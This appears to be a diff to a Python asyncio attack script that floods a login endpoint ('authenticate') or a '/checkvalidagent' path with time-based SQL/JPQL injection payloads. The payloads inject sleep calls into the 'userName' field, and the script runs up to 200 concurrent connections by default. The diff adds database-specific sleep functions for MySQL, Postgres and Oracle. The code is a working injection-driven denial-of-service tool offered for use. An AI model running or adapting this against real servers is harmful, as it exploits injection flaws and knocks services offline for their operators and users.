@@ -20,16 +20,28 @@ Stop with Ctrl+C (SIGINT).
 import asyncio, argparse, json, time, signal, sys, ssl
 from urllib.parse import urlparse, quote
 
-PAYLOAD_TEMPLATE = {
+PAYLOAD_BASE = {
     "header": {},
     "payload": {
-        # Injected userName with sleep; sleepSeconds substituted at runtime
-        "userName": "0' or (function('sleep',{sleepSeconds})=0) or '1'='2",
+        "userName": None,  # set at runtime
         "password": "y",
     },
 }
 
-AGENT_INJECTION_TEMPLATE = "0' or (function('sleep',{sleepSeconds})=0) or '1'='2"
+def build_injection(db: str, sleep_seconds: int) -> str:
+    db = db.lower()
+    if db in {"mysql", "mariadb", "h2", "hsqldb"}:
+        expr = f"function('sleep',{sleep_seconds})=0"
+    elif db == "postgres":
+        # pg_sleep returns void; treat call result as null -> predicate using IS NULL
+        expr = f"function('pg_sleep',{sleep_seconds}) is null"
+    elif db == "oracle":
+        # dbms_lock.sleep(N) returns 0 on success
+        expr = f"function('dbms_lock.sleep',{sleep_seconds})=0"
+    else:
+        # Fallback: no portable sleep; use tautology so request still parses
+        expr = "1=1"
+    return f"0' or ({expr}) or '1'='2"
 
 stop_requested = False
 sent = 0
@@ -105,15 +117,13 @@ async def run(args):
 
     body_bytes = b""
     prebuilt_agent_path = None
+    inj_full = build_injection(args.db, args.sleep)
     if args.target == "authenticate":
-        body_obj = PAYLOAD_TEMPLATE.copy()
-        body_payload = body_obj["payload"].copy()
-        body_payload["userName"] = body_payload["userName"].format(sleepSeconds=args.sleep)
-        body_obj["payload"] = body_payload
+        body_obj = json.loads(json.dumps(PAYLOAD_BASE))  # deep copy via serialize
+        body_obj["payload"]["userName"] = inj_full
         body_bytes = json.dumps(body_obj, separators=(",", ":")).encode()
     else:
-        inj = AGENT_INJECTION_TEMPLATE.format(sleepSeconds=args.sleep)
-        inj_enc = quote(inj, safe="")
+        inj_enc = quote(inj_full, safe="")
         path = parsed.path or "/checkvalidagent"
         if path == "/":
             path = "/checkvalidagent"
@@ -159,7 +169,8 @@ def parse_args():
     ap.add_argument("--target", choices=["authenticate", "agent"], default="authenticate", help="Endpoint target: authenticate (POST) or agent (GET /checkvalidagent)")
     ap.add_argument("--concurrency", type=int, default=200, help="Max simultaneous open connections")
     ap.add_argument("--interval", type=float, default=0.0, help="Delay between scheduling requests (seconds)")
-    ap.add_argument("--sleep", type=int, default=10, help="DB sleep seconds inside injected payload")
+    ap.add_argument("--sleep", type=int, default=10, help="DB sleep seconds inside injected payload (if supported by chosen DB)")
+    ap.add_argument("--db", choices=["mysql","mariadb","postgres","mssql","oracle","h2","hsqldb","derby","sqlite"], default="mysql", help="Target DB type to tailor sleep function (default: mysql)")
     ap.add_argument("--connect-timeout", type=float, default=3.0, help="TCP connect timeout")
     ap.add_argument("--write-timeout", type=float, default=3.0, help="Write/drain timeout")
     ap.add_argument("--linger", type=float, default=0.0, help="Optional delay after sending before closing")
